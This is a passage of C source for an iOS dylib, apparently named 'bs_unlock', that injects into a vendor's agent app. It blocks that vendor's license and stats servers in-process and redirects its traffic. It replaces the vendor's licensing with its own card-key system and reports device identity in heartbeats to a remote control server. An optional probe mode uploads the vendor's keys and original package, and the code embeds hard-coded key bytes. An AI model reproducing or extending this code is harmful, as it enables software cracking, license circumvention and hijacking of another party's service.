    bs_off_query(out, n);
}

// 生成 "&nm=<设备名>&md=<型号>&ov=<系统版本>[&pc=<中控IP>]"；全空返回空串
//   ★ v6.25g：&of=&ofn= 不在这里拼 —— 改由 bs_q_live() 每次现算（不然会冻结）。
static void bs_devinfo_query(char *out, size_t n) {
    char hn[128], mach[64], osv[32], pc[64];
    char hn_e[384], mach_e[200], osv_e[100], pc_e[200];
    bs_sysctl_str("kern.hostname", hn, sizeof(hn));
    bs_sysctl_str("hw.machine", mach, sizeof(mach));
    bs_sysctl_str("kern.osproductversion", osv, sizeof(osv));
    bs_pc_ip_of_plist(pc, sizeof(pc));
    if (!hn[0] && !mach[0] && !osv[0] && !pc[0]) {
        out[0] = 0;
        return;
    }
    bs_urlenc(hn, hn_e, sizeof(hn_e));
    bs_urlenc(mach, mach_e, sizeof(mach_e));
    bs_urlenc(osv, osv_e, sizeof(osv_e));
    snprintf(out, n, "&nm=%s&md=%s&ov=%s", hn_e, mach_e, osv_e);
    // ★ v6.23p：dylib 版本号随心跳上报（服务端设备表显示，装没装一眼可见）
    {
        size_t cur = strlen(out);
        if (cur + strlen("&dv=") + strlen(BS_DYLIB_VER) + 1 < n)
            snprintf(out + cur, n - cur, "&dv=" BS_DYLIB_VER);
    }
    if (pc[0]) {   // ★ v6.11：追加中控 IP
        bs_urlenc(pc, pc_e, sizeof(pc_e));
        size_t cur = strlen(out);
        if (cur + strlen(pc_e) + 8 < n)
            snprintf(out + cur, n - cur, "&pc=%s", pc_e);
    }
    // ★ v6.25g：这里**不再**追加 &of=&ofn= —— 见 bs_q_live() 的注释。
}

// ---- ★ v6.29：conf 单键原子回写（token 自愈专用）
//
// 背景（2026-10-21 取证）：云端 635 台里 48 台 devid 与 dv 都是空串。
//   断链 A —— postinst 只在装包那一刻从 agent.log 抓
//      `send dev online success:<hex>` 写 token=，抓不到就跳过，**此后再无补写机会**；
//   断链 B —— v6.26 的本地设备码只救了卡密（bs_card_device_id），心跳 /hb?key=
//      用的 g_token 从来不回填。结果同一台设备卡密侧有稳定 32hex、心跳侧是空。
// 后果：云端按 `ip:<addr>` 记账（bsmod_server.py touch_dev），s2 改道/离线开关/
//   deny 全按 devid 匹配 → IP 一变规则全失效；devlog 收不到（云端完全瞎）。
//
// 这里做一次性自愈：token 空 → 按 hw.serial → .bs_devid 32hex 取一个稳定身份，
// 与 bs_card_device_id() 完全同一套优先级，保证 /hb 的 key 与卡密 device_id 恒等。
// 只在 g_token 为空时动手，已有 token 的设备一行不改。
static int bs_conf_set_key(const char *path, const char *key, const char *val) {
    size_t kl = strlen(key), vl = strlen(val);
    char *body = NULL;
    size_t bl = 0, cap = 0;
    int hit = 0;

    FILE *f = fopen(path, "r");
    if (f) {
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            size_t ln = strlen(line);
            size_t need = bl + (kl + vl + 4) + ln + 1;
            if (need > cap) {
                size_t nc = cap ? cap : 4096;
                while (nc < need) nc *= 2;
                char *nb = (char *)realloc(body, nc);
                if (!nb) { free(body); fclose(f); return 0; }
                body = nb; cap = nc;
            }
            if (!hit && ln > kl && !strncmp(line, key, kl) && line[kl] == '=') {
                int w = snprintf(body + bl, cap - bl, "%s=%s\n", key, val);
                if (w > 0) bl += (size_t)w;
                hit = 1;
                continue;                       // 整行替换，不保留原值
            }
            memcpy(body + bl, line, ln);
            bl += ln;
            body[bl] = 0;
        }
        fclose(f);
    }
    if (!hit) {                                 // 没有这个键 → 末尾追加
        size_t need = bl + kl + vl + 4 + 1;
        if (need > cap) {
            size_t nc = cap ? cap : 4096;
            while (nc < need) nc *= 2;
            char *nb = (char *)realloc(body, nc);
            if (!nb) { free(body); return 0; }
            body = nb; cap = nc;
        }
        // 原文件末行若没换行，先补一个，否则会把新键粘在半行后面
        if (bl > 0 && body[bl - 1] != '\n') {
            body[bl++] = '\n';
            body[bl] = 0;
        }
        int w = snprintf(body + bl, cap - bl, "%s=%s\n", key, val);
        if (w > 0) bl += (size_t)w;
    }

    char tmp[320];
    snprintf(tmp, sizeof(tmp), "%s.tmp", path);
    int out = open(tmp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out < 0) { free(body); return 0; }
    ssize_t w = (body && bl) ? write(out, body, bl) : 0;
    fsync(out);
    close(out);
    free(body);
    if (w < 0 || (size_t)w != bl) { unlink(tmp); return 0; }
    if (rename(tmp, path) != 0) { unlink(tmp); return 0; }
    return 1;
}

static void bs_card_devid_local(void);          // 定义在后面（设备码生成）

/// token 空自愈（动机与优先级见上面 bs_conf_set_key 的注释块）
/// ★★★★ v6.41：**单一真源**。旧版三级回退（hw.serial → .bs_devid 随机 → 空）
///   就是设备号漂移的根源 —— hw.serial 在 iOS 上恒为字面量 "unknown"，
///   一退就退到 md5(时间|pid|栈) 随机 32hex，卸载/覆盖一次换一个号，
///   卡库绑定全部失配（2026-10-27 现场复现）。
///   现在：真源没就位就**什么都不做**，等 bs_identity_tick() 下一拍再取。
///   不生成、不猜、不回退。来源语义见 bs_deveid_resolve() 注释块。
static void bs_token_selfheal(void) {
    if (g_token[0]) return;                     // 已有 token：一行不改
    bs_card_devid_local();                      // 唯一来源（内部 = bs_deveid_resolve）
    if (!g_card_devid[0]) {
        bs_log("[id] token empty: dev_id not ready -> defer "
               "(no hw.serial, no random, no fallback)");
        return;
    }
    snprintf(g_token, sizeof(g_token), "%s", g_card_devid);
    bs_evt("[id] token adopted %.8s (src=agent.dev_id) conf_write=%d",
           g_token, bs_conf_set_key(PULL_CONF, "token", g_token));
}

static void bs_load_conf(void) {
    g_stat_vp_net = inet_addr(STAT_VENDOR_IP);   // ★ v6.23l：厂商统计 IP（固定常量）
    FILE *f = fopen(PULL_CONF, "r");
    if (!f) {                                   // conf 缺失（异常）：仍要做 token 自愈，否则永远 ip: 记账
        bs_log("[conf] bs_pull.conf missing -> defaults + token self-heal");
        bs_token_selfheal();
        return;
    }
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = 0;
        char *k = line, *v = eq + 1;
        // 去空白与换行
        while (*k == ' ' || *k == '\t') k++;
        char *ke = k + strlen(k);
        while (ke > k && (ke[-1] == ' ' || ke[-1] == '\t' || ke[-1] == '\r' || ke[-1] == '\n')) *--ke = 0;
        while (*v == ' ' || *v == '\t') v++;
        char *ve = v + strlen(v);
        while (ve > v && (ve[-1] == ' ' || ve[-1] == '\t' || ve[-1] == '\r' || ve[-1] == '\n')) *--ve = 0;

        if (!strcmp(k, "host") && v[0]) {          // ★ v6.2：可选覆盖服务端地址
            strncpy(g_host, v, sizeof(g_host) - 1);
            g_host[sizeof(g_host)-1] = 0;
        }
        else if (!strcmp(k, "port"))  g_port = atoi(v);
        else if (!strcmp(k, "tick"))  g_tick = atoi(v);
        else if (!strcmp(k, "enable")) g_enable = atoi(v);
        else if (!strcmp(k, "token")) { strncpy(g_token, v, sizeof(g_token) - 1); g_token[sizeof(g_token)-1] = 0; }
        else if (!strcmp(k, "hbmiss")) {
            // ★ v6.1：心跳失联容忍次数（clamp 到 1..60，防止写出 0 导致误杀）
            int m = atoi(v);
            if (m < 1)  m = 1;
            if (m > 60) m = 60;
            g_hb_max = m;
        }
        else if (!strcmp(k, "moddir") && v[0] == '/') {
            strncpy(g_mod_dir, v, sizeof(g_mod_dir) - 1);
            g_mod_dir[sizeof(g_mod_dir)-1] = 0;
        }
        else if (!strcmp(k, "mode")) {
            // ★ v6.4：只有 probe 走雷达模式，其余（含拼错）一律按 unlock，避免误配成「什么都不做」
            g_mode = (!strcmp(v, "probe")) ? MODE_PROBE : MODE_UNLOCK;
        }
        else if (!strcmp(k, "sosync")) {
            // ★ v6.6：主动跟版开关（写 0 关掉；缺省开）
            g_so_sync = atoi(v) ? 1 : 0;
        }
        else if (!strcmp(k, "probeupl")) {
            // ★★★ v6.37：probe 上行开关（缺省/写 0 = 不上传；写 1 = 恢复老的
            //   「密钥 + 1MB 包体」上报）。probe 的上传会把厂商原版顶到全网，慎开。
            g_probe_upl = atoi(v) ? 1 : 0;
        }
        else if (!strcmp(k, "autoreload")) {
            // ★ v6.7：落盘后自动重启开关（缺省开；写 0 关掉，只落盘不动脚本）
            g_autoreload = atoi(v) ? 1 : 0;
        }
        else if (!strcmp(k, "crashresume")) {
            // ★ v6.17：func-nil 崩溃自动恢复开关（缺省开；写 0 关掉）
            g_crashresume = atoi(v) ? 1 : 0;
        }
        else if (!strcmp(k, "blockvps")) {
            // ★ v6.19：厂商服务器（vps.beibeiplay.com / 43.154.19.236）进程内屏蔽开关
            //   （缺省开；仅 unlock 模式生效，probe 真卡机永不装钩子）
            g_block_vps = atoi(v) ? 1 : 0;
            // ★ v6.24s：hook 已装（可能在 blockvps=0 时为 s2 装过）→ 同步闸门
            if (g_blk_installed) g_blk_active = g_block_vps;
        }
        else if (!strcmp(k, "cardcheck")) {
            // ★ v6.20：自有卡密系统开关（缺省开；仅 unlock 模式起 cardwatch）
            g_cardcheck = atoi(v) ? 1 : 0;
        }
        else if (!strcmp(k, "cardgrace")) {
            // ★ v6.20：网络失败宽限（小时）——超时未成功校验才封禁
            g_cardgrace = atoi(v);
            if (g_cardgrace < 0) g_cardgrace = 1;
        }
        else if (!strcmp(k, "cardtick")) {
            // ★ v6.20：login 心跳间隔（秒）
            g_cardtick = atoi(v);
            if (g_cardtick < 60) g_cardtick = 60;
        }
        else if (!strcmp(k, "cardkey")) {
            // ★ v6.20：CardVault 应用 app_key（X-Card-Key 头）
            snprintf(g_card_key, sizeof(g_card_key), "%s", v);
        }
        else if (!strcmp(k, "cardhost")) {
            // ★ v6.20：CardVault 服务地址 host:port
            snprintf(g_card_host, sizeof(g_card_host), "%s", v);
        }
        else if (!strcmp(k, "noteport")) {
            // ★ v6.45：向 BBCenter 中控写「备注」的上报端口（缺省 34878）
            g_noteport = atoi(v);
            if (g_noteport < 1 || g_noteport > 65535) g_noteport = 34878;
        }
        else if (!strcmp(k, "statip")) {
            // ★ v6.23l：统计上报改道目标（点分 IP）。空值/非法值=关闭改道。
            if (v[0]) {
                uint32_t n = inet_addr(v);
                if (n != 0xFFFFFFFF && n != 0) {
                    snprintf(g_stat_ip, sizeof(g_stat_ip), "%s", v);
                    g_stat_ip_net = n;
                }
            }
        }
        else if (!strcmp(k, "s2")) {
            // ★ v6.24s：server2 改道目标（离线兜底）。格式 ip[:port] / off / vendor。
            //   优先级低于 /hb 下发：心跳每拍会覆盖本值（含 off 清空）。
            bs_s2_apply(v, "conf");
        }
        else if (!strcmp(k, "offline")) {
            // ★ v6.25：真离线开关。1=进程内接管 server2（不连厂商）；0=照常直连。
            //   默认 0，现网设备不受影响；开启后 s2 改道优先（有 s2 仍走 s2）。
            //   v6.25b：与 /hb 下发共用 bs_offline_apply，心跳可远程覆盖本值。
            bs_offline_apply(v, "conf");
        }
        else if (!strcmp(k, "cardval")) {
            // ★ v6.21：手动卡密（兜底通道）——getter/日志捕获均无卡时用它激活
            snprintf(g_cardval, sizeof(g_cardval), "%s", v);
        }
        else if (!strcmp(k, "sotick")) {
            // ★ v6.6：跟版复查间隔（clamp 30..3600，防 0 造成忙等）
            int t = atoi(v);
            if (t < SO_SYNC_MIN_TICK) t = SO_SYNC_MIN_TICK;
            if (t > SO_SYNC_MAX_TICK) t = SO_SYNC_MAX_TICK;
            g_so_tick = t;
        }
        else if (!strcmp(k, "offstall")) {
            // ★ v6.25e：连续多少次**协议级异常**判为「厂商协议可能变了」。
            //   （v6.25d 数的是「没走到 accepted」，会把正常短连接算进去 → 误报）
            //   正常 15~20s 一轮，5 次 ≈ 100s。clamp 2..60：写 0/1 会秒报警，
            //   写太大则失去预警意义。
            int t = atoi(v);
            if (t < 2)  t = 2;
            if (t > 60) t = 60;
            g_offstall = t;
        }
        else if (!strcmp(k, "egress")) {
            // ★ v6.25i：离线出站白名单开关。
            //   1（默认）= 只放行 回环 / 我们云端 / 中控 / sohost，其余一律拒绝；
            //   0 = 退回旧的「只管 7891/7875/7880」行为（现场逃生门）。
            g_off_egress = atoi(v) ? 1 : 0;
        }
        else if (!strcmp(k, "sohost") && v[0]) {
            // ★ v6.9：局域网中继地址（仅 beta.so 下载走它；空/缺省=直连云端）
            strncpy(g_sohost, v, sizeof(g_sohost) - 1);
            g_sohost[sizeof(g_sohost)-1] = 0;
            // ★ v6.25i：白名单要放行它，否则离线机的 beta.so 下载会被自己拦掉
            {
                uint32_t t = inet_addr(g_sohost);
                if (t != INADDR_NONE) g_off_so_net = t;
            }
        }
        else if (!strcmp(k, "soport")) {
            // ★ v6.9：中继端口（<=0 时回落 g_port）
            g_soport = atoi(v);
        }
    }
    fclose(f);

    // ★★★ v6.29：token 为空自愈（必须在下面拼 g_qbuf 之前，否则首轮 /hb 仍是空 key）
    bs_token_selfheal();

    // 拼 query string（纯 C）：有 token 就 "?key=xxx"，否则空串。
    // 拼好后 bs_pull_modules 直接 snprintf 进 URL，不必再碰 ObjC。
    if (g_token[0]) snprintf(g_qbuf, sizeof(g_qbuf), "?key=%s", g_token);
    else            g_qbuf[0] = 0;
    // ★ v6.10：追加设备信息（/hb 与 /manifest 同带；服务端只解析 /hb）
    {
        char q[384];
        bs_devinfo_query(q, sizeof(q));
        if (q[0]) {
            size_t cur = strlen(g_qbuf);
            if (cur + strlen(q) < sizeof(g_qbuf))
                memcpy(g_qbuf + cur, q, strlen(q) + 1);
        }
    }

    // ★ v6.12：缓存 app.plist 的中控 ip —— beta.so 中继地址直接用它（见 so_sync 下载处）
    bs_pc_ip_of_plist(g_appip, sizeof(g_appip));

    bs_log("[conf] dylib=%s port=%d tick=%d enable=%d mode=%s token=%s q=%s moddir=%s hbmiss=%d sosync=%d probeupl=%d sotick=%d offstall=%d autoreload=%d crashresume=%d blockvps=%d egress=%d cardcheck=%d cardgrace=%d cardtick=%d cardhost=%s cardval=%s sohost=%s soport=%d appip=%s statip=%s",
           BS_DYLIB_VER,
           g_port, g_tick, g_enable, g_mode == MODE_PROBE ? "probe" : "unlock",
           g_token[0] ? "(set)" : "(none)",
           g_qbuf[0] ? g_qbuf : "(none)", g_mod_dir, g_hb_max,
           g_so_sync, g_probe_upl, g_so_tick, g_offstall, g_autoreload,
           g_crashresume, g_block_vps, g_off_egress,
           g_cardcheck, g_cardgrace, g_cardtick,
           g_card_host, g_cardval[0] ? "(set)" : "(none)",
           g_sohost[0] ? g_sohost : "(none)", g_soport,
           g_appip[0] ? g_appip : "(none)",
           g_stat_ip[0] ? g_stat_ip : "(off->appip)");
}

/// ★★★★ v6.41：设备身份落定（每拍调用，幂等，代价 = 一次 dlsym 缓存 + 一次读内存）
///
/// 动机：conf 的 `token=` 与 `?key=` 在 bs_load_conf 里**只拼一次**，而那一刻
///   Agent 往往还没收到服务端下发的设备码 —— 冷启顺序是「dylib 先跑，Agent 后连」。
///   旧版因此整会话 /hb 无 key，云端只能按 `ip:<addr>` 记账，
///   devid 匹配的 s2 改道 / 离线开关 / deny 规则全失效。
/// 现在：真源一就位就回填 token + 重拼 query + 落 conf，
///   从此心跳 key 与卡密 device_id **恒等**（同一台设备永远同一个号）。
static void bs_identity_tick(void) {
    if (g_token[0]) return;                     // 已落定：一行不改
    bs_card_devid_local();                      // 唯一来源
    if (!g_card_devid[0]) return;               // 真源未就位：等下一拍，不猜
    snprintf(g_token, sizeof(g_token), "%s", g_card_devid);
    int n = snprintf(g_qbuf, sizeof(g_qbuf), "?key=%s", g_token);
    char q[384] = {0};
    bs_devinfo_query(q, sizeof(q));
    if (q[0] && n > 0 && (size_t)n + strlen(q) < sizeof(g_qbuf))
        memcpy(g_qbuf + n, q, strlen(q) + 1);
    int w = bs_conf_set_key(PULL_CONF, "token", g_token);
    bs_evt("[id] token settled %.8s (src=agent.dev_id) conf_write=%d", g_token, w);
    bs_log("[id] identity settled devid=%.32s q=%s", g_token, g_qbuf);
}

// ---- 日志（提前定义，供 bs_load_conf 使用）
//
// ★★ 2026-09-26 修正：绝对不能在这里用 NSLog！
//    bs_log 会在两条裸 pthread 线程（bs_watchdog / bs_puller）以及 +load 早期
//    阶段被调用。NSLog 是 ObjC 调用，在 ObjC runtime / autorelease pool / TLS
//    尚未就绪时会走到 objc_msgSend 上对坏指针解引用，实测崩溃：
//      EXC_BAD_ACCESS (SIGSEGV) KERN_INVALID_ADDRESS at 0x10
//      thread: objc_msgSend <- bs_puller <- _pthread_start
//    改成纯 POSIX（write + 手工拼时间戳），任何线程任何阶段都安全。
// ---- ★ v6.29：日志尾部保留式轮转
//
// 现场取证（2026-10-21，8149PJ 装机约 8h）：
//   bs_unlock.log  733 KB  ← 我们，[pull]/[hb]/[devlog] 每 tick 都写
//   bs_evt.log      13 KB  ← 我们，只写决策级事件
//   sjz.log        776 KB  ← 厂商
//   sreen.log      705 KB  ← 厂商
//   agent.log      120 KB  ← 厂商
// bs_log / bs_evt 都是裸 O_APPEND，无上限无轮转 ⇒ 按当前速率 bs_unlock.log
// ≈2.2 MB/天 ⇒ 一年 800 MB。iOS 的 /var/mobile/Media 会被拖死。
//
// ★ 只清我们自己那两个，厂商的三个一律不碰：
//   agent.log 是崩溃扫描基线（cr_size[]），清空会让 [cr] 漏一次真崩溃；
//   sjz.log 的 mtime 是 bs_file_age() 判「刚刚真在跑」的依据，清空会把 mtime
//   刷成当前 ⇒ 被误判成刚跑过 ⇒ [ar] 误武装。sreen.log 与我们无关。
//
// 做法：不建 .1/.2 归档（iOS 上多文件更易漏清），只保留尾部；读尾 → 从第一个
// 换行起对齐（不产生半行）→ 写 tmp → rename 原子替换，读侧永远看到完整文件。
// 代价：每 60s 一次 stat()，可忽略。
#define BS_LOG_MAX       (1024 * 1024)   // 1 MB 触发
#define BS_LOG_KEEP      (512 * 1024)    // 保留尾部 512 KB
#define BS_EVT_MAX       (512 * 1024)
#define BS_EVT_KEEP      (256 * 1024)
#define BS_ROT_CHK_SECS  60              // 每 60s 最多 stat 一次

/// 裸写一行（带时间戳），供轮转自述用 —— 不走 bs_log，避免递归
static void bs_raw_line(const char *path, const char *msg) {
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    char line[256];
    int n = snprintf(line, sizeof(line), "[%ld.%03ld] %s\n",
                     (long)ts.tv_sec, (long)(ts.tv_nsec / 1000000), msg);
    if (n <= 0) return;
    if ((size_t)n > sizeof(line)) n = (int)sizeof(line);
    int fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0) {
        ssize_t w = write(fd, line, (size_t)n);
        (void)w;
        close(fd);
    }
}

static void bs_log_rotate(const char *path, long maxsz, long keep) {
    struct stat st;
    if (stat(path, &st) != 0) return;
    long sz = (long)st.st_size;
    if (sz <= maxsz) return;

    long off = sz - keep;
    if (off < 0) off = 0;
    int in = open(path, O_RDONLY);
    if (in < 0) return;
    char *buf = (char *)malloc((size_t)keep + 1);
    if (!buf) { close(in); return; }
    if (lseek(in, off, SEEK_SET) < 0) { free(buf); close(in); return; }
    ssize_t gn = read(in, buf, (size_t)keep);
    close(in);
    if (gn <= 0) { free(buf); return; }

    long s = 0;
    if (off > 0) {                       // 丢掉可能被截半的首行
        while (s < gn && buf[s] != '\n') s++;
        if (s < gn) s++;
    }
    if (s >= gn) s = 0;                  // 整块无换行（超长单行）→ 宁可整块保留，别清成空

    char tmp[320];
    snprintf(tmp, sizeof(tmp), "%s.tmp", path);
    int out = open(tmp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out >= 0) {
        ssize_t w = write(out, buf + s, (size_t)(gn - s));
        (void)w;
        fsync(out);
        close(out);
        if (rename(tmp, path) == 0) {
            char msg[224];
            snprintf(msg, sizeof(msg), "[log] rotated %s (%ld -> ~%ld B)",
                     path, sz, keep);
            bs_raw_line(path, msg);
        } else {
            unlink(tmp);
        }
    }
    free(buf);
}

/// 两个文件都查一遍（各自阈值不同）
static void bs_log_rotate_tick(void) {
    static time_t rot_chk = 0;
    time_t nowt = time(NULL);
    if (rot_chk && nowt - rot_chk < BS_ROT_CHK_SECS) return;
    rot_chk = nowt;
    bs_log_rotate(BS_LOG_PATH, BS_LOG_MAX, BS_LOG_KEEP);
    bs_log_rotate(BS_EVT_PATH, BS_EVT_MAX, BS_EVT_KEEP);
}

static void bs_log(const char *fmt, ...) {
    bs_log_rotate_tick();
    char buf[768];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    // 手工时间戳（避免 time/localtime 的锁问题，直接用 clock_gettime + 简单换算）
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    char line[896];
    int n = snprintf(line, sizeof(line), "[%ld.%03ld] %s\n",
                     (long)ts.tv_sec, (long)(ts.tv_nsec / 1000000), buf);
    if (n < 0) return;
    if ((size_t)n > sizeof(line)) n = (int)sizeof(line);

    // 只写文件，不碰 ObjC。/tmp 与 App 数据目录都试一遍。
    int fd = open(BS_LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) fd = open("/tmp/bs_unlock.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0) {
        ssize_t w = write(fd, line, (size_t)n);
        (void)w;
        close(fd);
    }
}

/// ★ v6.24r：决策级事件双写 —— 主日志保留原样（现场连着看），同时追加到
///   bs_evt.log 专道。只给 [us]/[cr]/[so]/[wd] 这类低频关键事件用；
///   [pull]/[hb]/[devlog] 这些高频流水仍然只走 bs_log，绝不进事件道。
static void bs_evt(const char *fmt, ...) {
    char buf[768];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    bs_log("%s", buf);            // 主日志照旧

    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    char line[896];
    int n = snprintf(line, sizeof(line), "[%ld.%03ld] %s\n",
                     (long)ts.tv_sec, (long)(ts.tv_nsec / 1000000), buf);
    if (n <= 0) return;
    if ((size_t)n > sizeof(line)) n = (int)sizeof(line);
    int fd = open(BS_EVT_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0) {
        ssize_t w = write(fd, line, (size_t)n);
        (void)w;
        close(fd);
    }
}

// ---------------------------------------------------------------- v6.24r 运行库生效状态
/// 落盘新 so 时写 pend=1；脚本真正启动（run 0->1）时清 0。
/// 任意线程可写（原子 rename），watchdog 每 5 分钟读一次诊断，无锁需求。
static void bs_so_state_write(int pending, const char *md5, long size) {
    char tmp[320], fin[320];
    snprintf(tmp, sizeof(tmp), "%s.tmp", BS_SO_STATE_PATH);
    snprintf(fin, sizeof(fin), "%s", BS_SO_STATE_PATH);
    FILE *f = fopen(tmp, "w");
    if (!f) return;
    long now = (long)time(NULL);
    long applied = 0;
    // 保留上次 applied（清 pend 时要沿用）
    {
        FILE *p = fopen(fin, "r");
        if (p) {
            char b[256] = {0};
            if (fgets(b, sizeof(b), p)) {
                const char *q = strstr(b, "applied=");
                if (q) applied = atol(q + 8);
            }
            fclose(p);
        }
    }
    if (!pending) applied = now;
    fprintf(f, "md5=%s size=%ld disk=%ld pend=%d applied=%ld\n",
            md5 ? md5 : "?", size, now, pending, applied);
    fclose(f);
    rename(tmp, fin);
}

/// 读状态：返回 1=有记录；md5out/size/pend/applied/disk 均可为 NULL
/// ★ v6.29：新增 disk（落盘时刻）—— 用来判「pend=1 挂了多久还没生效」
static int bs_so_state_read(char *md5out, size_t mn, long *size, int *pend,
                            long *applied, long *disk) {
    FILE *f = fopen(BS_SO_STATE_PATH, "r");
    if (!f) return 0;
    char b[256] = {0};
    int ok = (fgets(b, sizeof(b), f) != NULL);
    fclose(f);
    if (!ok) return 0;
    if (md5out && mn) {
        md5out[0] = 0;
        const char *q = strstr(b, "md5=");
        if (q) {
            size_t i = 0;
            q += 4;
            while (i + 1 < mn && q[i] && q[i] != ' ' && q[i] != '\n') { md5out[i] = q[i]; i++; }
            md5out[i] = 0;
        }
    }
    if (size)     { const char *q = strstr(b, "size=");    *size    = q ? atol(q + 5) : -1; }
    if (pend)     { const char *q = strstr(b, "pend=");    *pend    = q ? atoi(q + 5) : -1; }
    if (applied)  { const char *q = strstr(b, "applied="); *applied = q ? atol(q + 8) : 0;  }
    if (disk)     { const char *q = strstr(b, "disk=");    *disk    = q ? atol(q + 5) : 0;  }
    return 1;
}

static const unsigned char kKey[3] = {0x02, 0x09, 0x09};

static const unsigned char kVal[32] = {
    0xa3, 0xa4, 0xe3, 0x3e, 0xa9, 0x13, 0xee, 0xe6,
    0xd8, 0x7d, 0x86, 0x27, 0x8b, 0x5b, 0xc4, 0x53,
    0x1e, 0xd3, 0x51, 0x49, 0xef, 0xb2, 0x87, 0x9f,
    0xa0, 0x24, 0xf1, 0xc9, 0x81, 0xa1, 0x43, 0x9b
};

static uintptr_t g_base = 0;


static uintptr_t bs_find_base(void) {
    uint32_t count = _dyld_image_count();
    for (uint32_t i = 0; i < count; i++) {
        const char *name = _dyld_get_image_name(i);
        if (name && strstr(name, AGENT_NAME)) {
            return (uintptr_t)_dyld_get_image_header(i);
        }
    }
    return 0;
}

// ---------------------------------------------------------------- 模块注入
static int bs_inject_modules(uintptr_t base);

// ---------------------------------------------------------------- v5 拉取
// ---- md5（自实现，避免依赖 CommonCrypto 的链接细节）
typedef struct { uint32_t a, b, c, d; } md5_ctx;

static uint32_t rol(uint32_t x, int c) { return (x << c) | (x >> (32 - c)); }

static void md5_block(md5_ctx *ctx, const unsigned char *p) {
    static const uint32_t K[64] = {
        0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
        0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,
        0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
        0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
        0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
        0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
        0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
        0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391
    };
    static const int S[64] = {
        7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
        5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,
        4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
        6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21
    };
    uint32_t M[16];
    for (int i = 0; i < 16; i++)
        M[i] = (uint32_t)p[i*4] | ((uint32_t)p[i*4+1] << 8) |
               ((uint32_t)p[i*4+2] << 16) | ((uint32_t)p[i*4+3] << 24);
    uint32_t A = ctx->a, B = ctx->b, C = ctx->c, D = ctx->d;
    for (int i = 0; i < 64; i++) {
        uint32_t F; int g;
        if (i < 16)      { F = (B & C) | (~B & D);          g = i; }
        else if (i < 32) { F = (D & B) | (~D & C);          g = (5*i + 1) % 16; }
        else if (i < 48) { F = B ^ C ^ D;                   g = (3*i + 5) % 16; }
        else             { F = C ^ (B | ~D);                g = (7*i) % 16; }
        uint32_t tmp = D;
        D = C; C = B;
        B = B + rol(A + F + K[i] + M[g], S[i]);
        A = tmp;
    }
    ctx->a += A; ctx->b += B; ctx->c += C; ctx->d += D;
}

// ---- 纯 C 版 md5 工具（路线 A 专用）

/// 把二进制摘要转 32 字符小写 hex
static void bs_md5_hex(const unsigned char *d, size_t n, char *out, size_t outsz) {
    static const char hx[] = "0123456789abcdef";
    if (outsz < 33) { if (outsz) out[0] = 0; return; }
    (void)n;    // n 恒为 16
    for (int i = 0; i < 16; i++) {
        out[i * 2]     = hx[d[i] >> 4];
        out[i * 2 + 1] = hx[d[i] & 0x0f];
    }
    out[32] = 0;
}

/// 计算文件 md5（纯 POSIX 读；成功返回 1，并写 32 字符 hex 到 out）
///
/// 用「积攒到 64 字节就吃一块」的增量写法，对任意大小文件都正确。
/// 不依赖 ObjC，也没有 memmove 重排的边界坑。
static int bs_md5_file(const char *path, char *out, size_t outsz) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;

    md5_ctx ctx = {0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476};
    unsigned char buf[4096];
    unsigned char acc[64];      // 未满一块的余量
    size_t accn = 0;
    uint64_t total = 0;
    ssize_t r;

    while ((r = read(fd, buf, sizeof(buf))) > 0) {
        size_t len = (size_t)r;
        size_t off = 0;

        // 1) 先补齐 acc 到 64
        if (accn) {
            size_t need = 64 - accn;
            size_t take = (len < need) ? len : need;
            memcpy(acc + accn, buf, take);
            accn += take;
            off  += take;
            if (accn == 64) { md5_block(&ctx, acc); accn = 0; }
        }

        // 2) 整块直接吃
        while (off + 64 <= len) {
            md5_block(&ctx, buf + off);
            off += 64;
        }

        // 3) 余量存 acc
        if (off < len) {
            accn = len - off;
            memcpy(acc, buf + off, accn);
        }
        total += len;
    }
    close(fd);
    if (r < 0) return 0;

    // 收尾 padding（total 为真实字节数）
    unsigned char tail[128];
    memset(tail, 0, sizeof(tail));
    memcpy(tail, acc, accn);
    tail[accn] = 0x80;
    size_t padlen = (accn < 56) ? 64 : 128;
    uint64_t bits = total * 8;
    for (int i = 0; i < 8; i++)
        tail[padlen - 8 + i] = (unsigned char)(bits >> (8 * i));
    md5_block(&ctx, tail);
